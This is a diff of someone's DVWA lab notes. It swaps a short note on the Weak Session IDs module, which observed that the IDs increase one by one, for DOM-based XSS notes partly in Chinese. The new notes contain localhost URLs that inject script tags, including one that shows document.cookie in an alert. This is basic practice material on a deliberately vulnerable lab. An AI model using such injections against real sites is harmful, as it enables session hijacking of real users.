@@ -1,19 +1,27 @@
-# Weak Session IDs
-### Objective: This module uses four different ways to set the dvwaSession cookie value, the objective of each level is to work out how the ID is
-generated and then infer the IDs of other system users.
+# DOM Based Cross Site Scripting (XSS)
 
-## 觀察
+### Objective: Run your own JavaScript in another user's browser, use this to steal the cookie of a logged in user.
 
-```
-dvwaSession: 1
-```
-```
-dvwaSession: 2
-```
-```
-dvwaSession: 3
+### 觀察
+
+可以直接從 URL 塞入任意字串，頁面回傳後直接 render 在表單內，代表我們可以試著塞入 javascript 看看
+
+```html
+http://localhost:8086/vulnerabilities/xss_d/?default=English123
 ```
 
-可以很明顯地看出 dvwaSession 是遞增的
+```html
+http://localhost:8086/vulnerabilities/xss_d/?default=English<script>alert(1)</script>
+```
 
-這邊我暫時不知道要幹嘛，可能難度高一點的等級要分析 session ID 隨機性或 pattern 之類的 
+## Done
+```html
+http://localhost:8086/vulnerabilities/xss_d/?default=English<script>alert(document.cookie)</script>
+```
+
+### Ref
+
+### Types of XSS
+
+Types of XSS | OWASP Foundation
+[https://owasp.org/www-community/Types_of_Cross-Site_Scripting#DOM_Based_XSS_.28AKA_Type-0.29](https://owasp.org/www-community/Types_of_Cross-Site_Scripting#DOM_Based_XSS_.28AKA_Type-0.29)
